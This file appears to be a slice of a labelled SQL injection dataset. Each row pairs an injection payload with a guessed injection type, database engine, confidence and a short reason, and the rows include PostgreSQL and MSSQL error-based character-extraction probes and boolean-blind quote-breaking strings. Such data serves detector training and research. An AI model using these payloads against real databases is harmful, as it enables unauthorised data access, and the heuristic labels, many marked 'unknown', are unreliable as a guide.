id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
39109,"1%\' or username = ""-6203\' ) ) ) and ( ( ( \'luee\' = \'luee",unknown,generic,0.50,Insufficient data to classify payload type,1
39110,"-2756\' where 6156 = 6156 and username = ""-4610\' ) ) and ( ( \'hdco\' = \'hdco",unknown,generic,0.50,Insufficient data to classify payload type,1
39111,"1\' ) ) ) and ( ( ( \'sbey\' = \'sbey"" or username = ""1 and username = ""-5863",unknown,generic,0.50,Insufficient data to classify payload type,1
39112,"1\' ) or username = ""-1254",unknown,generic,0.50,Insufficient data to classify payload type,1
39113,1\'+ ( select onzd where 8452 = 8452 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\',error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39114,"select * from users WHERE username = ""1 or username = ""-4610\' ) ) or username = ""-5062 ) where 7457 = 7457 and username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""-7720 ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39115,"1%\' and \'%\' = \'"" or username = ""1",unknown,generic,0.50,Insufficient data to classify payload type,1
39116,"-3733\' ) ) or username = ""-6190\' ) where 2621 = 2621 or username = ""-6661\' ) ) || 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( \'tbmu\' like \'tbmu",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
39117,"-7323%"" and ""%"" = """" and username = ""1",unknown,generic,0.50,Insufficient data to classify payload type,1
39118,"1\' ) and username = ""1\' ) where 1502 = 1502 and ( ( 5616 = 5616"" or username = ""-6665\' ) ) ) and ( ( ( \'winx\' = \'winx",unknown,generic,0.50,Insufficient data to classify payload type,1
39119,"-7199\' and username = ""-7962\' ) ) as pgqz where 6058 = 6058 or username = ""-5863"" and ( ( 5139 = 5139",unknown,generic,0.50,Insufficient data to classify payload type,1
39120,1\'|| ( select \'byxb\' where 8351 = 8351 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) ||\',error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39121,"select * from users WHERE username = ""1\' and username = ""1 ) ) or username = ""1 ) as nbno where 9816 = 9816 and username = ""1\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39122,"1 ) ) as iihk where 5414 = 5414 and username = ""1\' ) ) and ( ( \'yhku\' like \'yhku",unknown,generic,0.50,Insufficient data to classify payload type,1
39123,1\'+ ( select onzd where 8452 = 8452 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\',error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39124,"select * from users WHERE username = ""-2756\' where 6156 = 6156 and username = ""-4610\' ) ) or username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39125,"select * from users WHERE username = ""1 ) ) as iihk where 5414 = 5414 and username = ""1\' ) ) as bswc where 1635 = 1635 or username = ""-9501\' )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39126,"select * from users WHERE username = ""-8860 ) or username = ""1\' ) ) and username = ""1%\' and username = ""-9564",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39127,1\' ) ) and ( ( \'ajka\' = \'ajka,unknown,generic,0.50,Insufficient data to classify payload type,1
39128,"select * from users WHERE username = ""1"" or username = ""1\' ) ) ) and username = ""-1254"" and username = ""-7072\' )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39129,"-8007\' ) ) as bgpp where 9555 = 9555 or username = ""-9847%\' ) ) ) or username = ""-1985 ) ) ) and ( ( ( 1248 = 1248"" or username = ""-9847%\' ) ) ) and ( ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
39130,1%\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'%\' = \',error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39131,"select * from users WHERE username = ""-8057\' ) ) as gpue where 4205 = 4205 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""1 ) where 3381 = 3381",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39132,"-1549\' ) and username = ""-6079 ) ) ) and ( ( ( 8708 = 8708",unknown,generic,0.50,Insufficient data to classify payload type,1
39133,-3499\' ) ) ) and ( ( ( \'nzap\' like \'nzap,unknown,generic,0.50,Insufficient data to classify payload type,1
39134,"SELECT * FROM users WHERE username = ""-2992\' ) ) and 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) OR username = ""-1157 ) ) as sxie where 7118 = 7118",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39135,"select * from users WHERE username = ""-1190\' and \'yxry\' like \'yxry"" or username = ""1\'|| ( select \'yucg\' where 2576 = 2576 or username = ""-8860 )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39136,"select * from users WHERE username = ""-1344 ) as gqgi where 2545 = 2545 and username = ""-1254"" and username = ""-4952\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39137,"-7242\' and username = ""1"" or username = ""1 ) ) ) and ( ( ( 6395 = 6395",unknown,generic,0.50,Insufficient data to classify payload type,1
39138,"-9564 and username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""-7720 ) ) and ( ( 8254 = 8254",unknown,generic,0.50,Insufficient data to classify payload type,1
39139,"select * from users WHERE username = ""1"" and ""xyjg"" = ""xyjg"" or username = ""-7242\' and \'kfff\' = \'kfff"" or username = ""-1254"" or username = ""-7209\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39140,"select * from users WHERE username = ""-5313\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""1 where 5161 = 5161 or username = ""-4322\' ) ) as magw where 1627 = 1627",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39141,"select * from users WHERE username = ""-1254"" or username = ""1"" or username = ""1%\' ) ) )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
39142,"select * from users WHERE username = ""1\' and username = ""-1549\' ) and ( ( 5616 = 5616"" or username = ""-2154%\'",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39143,"1 ) as zmxb where 8424 = 8424 and username = ""-6523"" or ( ( ( \'enfe\' like \'enfe",unknown,generic,0.50,Insufficient data to classify payload type,1
